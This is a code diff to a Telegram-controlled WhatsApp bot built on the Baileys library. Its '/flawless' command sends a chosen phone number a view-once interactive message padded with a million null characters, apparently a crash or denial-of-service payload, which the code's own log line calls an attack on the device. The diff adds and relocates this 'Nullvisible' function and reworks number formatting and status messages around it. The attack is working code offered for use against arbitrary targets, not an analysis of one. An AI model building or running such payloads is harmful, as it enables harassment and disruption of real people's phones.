@@ -4,7 +4,80 @@ const moment = require('moment');
 const {
     default: makeWASocket,
     useMultiFileAuthState,
-    DisconnectReason
+    downloadContentFromMessage,
+    emitGroupParticipantsUpdate,
+    emitGroupUpdate,
+    generateWAMessageContent,
+    generateWAMessage,
+    makeInMemoryStore,
+    prepareWAMessageMedia,
+    generateWAMessageFromContent,
+    MediaType,
+    generateMessageTag,
+    generateRandomMessageId,
+    areJidsSameUser,
+    WAMessageStatus,
+    downloadAndSaveMediaMessage,
+    AuthenticationState,
+    GroupMetadata,
+    initInMemoryKeyStore,
+    getContentType,
+    MiscMessageGenerationOptions,
+    useSingleFileAuthState,
+    BufferJSON,
+    cardsCrL,
+    WAMessageProto,
+    MessageOptions,
+    WAFlag,
+    encodeSignedDeviceIdentity,
+    WANode,
+    WAMetric,
+    ChatModification,
+    MessageTypeProto,
+    WALocationMessage,
+    ReconnectMode,
+    WAContextInfo,
+    proto,
+    WAGroupMetadata,
+    ProxyAgent,
+    waChatKey,
+    MimetypeMap,
+    MediaPathMap,
+    WAContactMessage,
+    WAContactsArrayMessage,
+    WAGroupInviteMessage,
+    WATextMessage,
+    WAMessageContent,
+    WAMessage,
+    BaileysError,
+    WA_MESSAGE_STATUS_TYPE,
+    MediaConnInfo,
+    URL_REGEX,
+    WAUrlInfo,
+    WA_DEFAULT_EPHEMERAL,
+    WAMediaUpload,
+    jidDecode,
+    mentionedJid,
+    processTime,
+    Browser,
+    MessageType,
+    Presence,
+    WA_MESSAGE_STUB_TYPES,
+    Mimetype,
+    relayWAMessage,
+    Browsers,
+    GroupSettingChange,
+    DisconnectReason,
+    WASocket,
+    getStream,
+    WAProto,
+    isBaileys,
+    AnyMessageContent,
+    fetchLatestBaileysVersion,
+    templateMessage,
+    InteractiveMessage,
+    Header,
+    generateMessageID,
 } = require('@whiskeysockets/baileys');
 const axios = require('axios');
 const AdmZip = require("adm-zip");
@@ -276,6 +349,46 @@ async function connectToWhatsApp(botNumber, chatId) {
 
     sock.ev.on("creds.update", saveCreds);
     return sock;
+}
+
+async function Nullvisible(sock, target) {
+    try {
+        let phoneNumber = target.replace(/\D/g, '');
+        
+        if (!phoneNumber.startsWith('62') && !phoneNumber.startsWith('1')) {
+            phoneNumber = '62' + phoneNumber;
+        }
+
+        if (phoneNumber.startsWith('0')) {
+            phoneNumber = '62' + phoneNumber.substring(1);
+        }
+
+        const jid = `${phoneNumber}@s.whatsapp.net`;
+
+        await sock.relayMessage(jid, {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "visiblemoment",
+                            format: "DEFAULT"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "call_permission_request",
+                            paramsJson: "\u0000".repeat(1000000),
+                            version: 3
+                        }
+                    }
+                }
+            }
+        }, { participant: { jid: jid }});
+        
+        console.log('NullVisibleAttackDeviceYou');
+        return true;
+    } catch (error) {
+        console.error('Error in Nullvisible:', error);
+        throw error;
+    }
 }
 
 bot.onText(/\/addsender/, async (msg) => {
@@ -942,19 +1055,18 @@ bot.onText(/\/infobot/, async (msg) => {
 bot.onText(/\/flawless (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id.toString();
-    
-    if (userId !== config.OWNER_ID) {
-        return;
-    }
 
-    const target = match[1];
+    if (userId !== config.OWNER_ID) return;
+
+    const q = match[1];
+    const formatednumber = q.replace(/[^0-9]/g, "");
+    if (!formatednumber) return bot.sendMessage(chatId, "❌ Nomor tidak valid!");
+
+    const target = formatednumber + "@s.whatsapp.net";
 
     if (sessions.size === 0) {
-        await bot.sendPhoto(
-            chatId,
-            'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
-            {
-                caption: `\`\`\`
+        await bot.sendPhoto(chatId, 'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg', {
+            caption: `\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴇʀʀᴏʀ
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -962,20 +1074,15 @@ bot.onText(/\/flawless (.+)/, async (msg, match) => {
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
 \`\`\``,
-                parse_mode: "Markdown"
-            }
-        );
+            parse_mode: "Markdown"
+        });
         return;
     }
 
     const sock = sessions.values().next().value;
-    
-    if (!sock || !sock.user) {
-        await bot.sendPhoto(
-            chatId,
-            'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
-            {
-                caption: `\`\`\`
+    if (!sock) {
+        await bot.sendPhoto(chatId, 'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg', {
+            caption: `\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴇʀʀᴏʀ
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -983,28 +1090,23 @@ bot.onText(/\/flawless (.+)/, async (msg, match) => {
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
 \`\`\``,
-                parse_mode: "Markdown"
-            }
-        );
+            parse_mode: "Markdown"
+        });
         return;
     }
 
-    const processingMsg = await bot.sendPhoto(
-        chatId,
-        'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
-        {
-            caption: `\`\`\`
+    const processingMsg = await bot.sendPhoto(chatId, 'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg', {
+        caption: `\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴘʀᴏsᴇs
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❯ ᴛᴀʀɢᴇᴛ: ${target}
+❯ ᴛᴀʀɢᴇᴛ: ${formatednumber}
 ❯ Status: ᴍᴇɴɢɪɴɪsɪᴀʟɪsᴀsɪ...
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
 \`\`\``,
-            parse_mode: "Markdown"
-        }
-    );
+        parse_mode: "Markdown"
+    });
 
     try {
         const progressStages = [
@@ -1012,27 +1114,25 @@ bot.onText(/\/flawless (.+)/, async (msg, match) => {
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴘʀᴏsᴇs
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❯ ᴛᴀʀɢᴇᴛ: ${target}
+❯ ᴛᴀʀɢᴇᴛ: ${formatednumber}
 ❯ Status: ᴍᴇɴʏɪᴀᴘᴋᴀɴ ᴘᴇsᴀɴ...
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
 \`\`\``,
-
             `\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴘʀᴏsᴇs
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❯ ᴛᴀʀɢᴇᴛ: ${target}
+❯ ᴛᴀʀɢᴇᴛ: ${formatednumber}
 ❯ Status: ᴍᴇɴɢɪʀɪᴍᴋᴀɴ...
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
 \`\`\``,
-
             `\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴘʀᴏsᴇs
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❯ ᴛᴀʀɢᴇᴛ: ${target}
+❯ ᴛᴀʀɢᴇᴛ: ${formatednumber}
 ❯ Status: ᴍᴇᴍᴘʀᴏsᴇs...
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
@@ -1051,69 +1151,41 @@ bot.onText(/\/flawless (.+)/, async (msg, match) => {
         await Nullvisible(sock, target);
         await sleep(500);
 
-        await bot.editMessageCaption(
-            `\`\`\`
+        await bot.editMessageCaption(`\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           sᴜᴄᴄᴇss
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❯ ᴛᴀʀɢᴇᴛ: ${target}
+❯ ᴛᴀʀɢᴇᴛ: ${formatednumber}
 ❯ Status: ʙᴇʀʜᴀsɪʟ ᴛᴇʀᴋɪʀɪᴍ
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
-\`\`\``,
-            {
-                chat_id: chatId,
-                message_id: processingMsg.message_id,
-                parse_mode: "Markdown",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: "ʟɪʜᴀᴛ ᴡʜᴀᴛsᴀᴘᴘ", url: `https://wa.me/${target}` }]
-                    ]
-                }
+\`\`\``, {
+            chat_id: chatId,
+            message_id: processingMsg.message_id,
+            parse_mode: "Markdown",
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "ʟɪʜᴀᴛ ᴡʜᴀᴛsᴀᴘᴘ", url: `https://wa.me/${formatednumber}` }]
+                ]
             }
-        );
+        });
 
     } catch (error) {
-        await bot.editMessageCaption(
-            `\`\`\`
+        await bot.editMessageCaption(`\`\`\`
 ◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
           ᴇʀʀᴏʀ
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❯ ᴛᴀʀɢᴇᴛ: ${target}
+❯ ᴛᴀʀɢᴇᴛ: ${formatednumber}
 ❯ Status: ${error.message}
 ❯ Time: ${moment().format('HH:mm:ss')}
 ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
-\`\`\``,
-            {
-                chat_id: chatId,
-                message_id: processingMsg.message_id,
-                parse_mode: "Markdown"
-            }
-        );
+\`\`\``, {
+            chat_id: chatId,
+            message_id: processingMsg.message_id,
+            parse_mode: "Markdown"
+        });
     }
 });
-
-async function Nullvisible(sock, target) {
-    await sock.relayMessage(target, {
-        viewOnceMessage: {
-            message: {
-                interactiveResponseMessage: {
-                    body: {
-                        text: "visiblemoment",
-                        format: "DEFAULT"
-                    },
-                    nativeFlowResponseMessage: {
-                        name: "call_permission_request",
-                        paramsJson: "\u0000".repeat(1000000),
-                        version: 3
-                    }
-                }
-            }
-        }
-    }, { participant: { jid: target }});
-    
-    console.log('NullVisibleAttackDeviceYou');
-}
 
 initializeWhatsAppConnections();
 
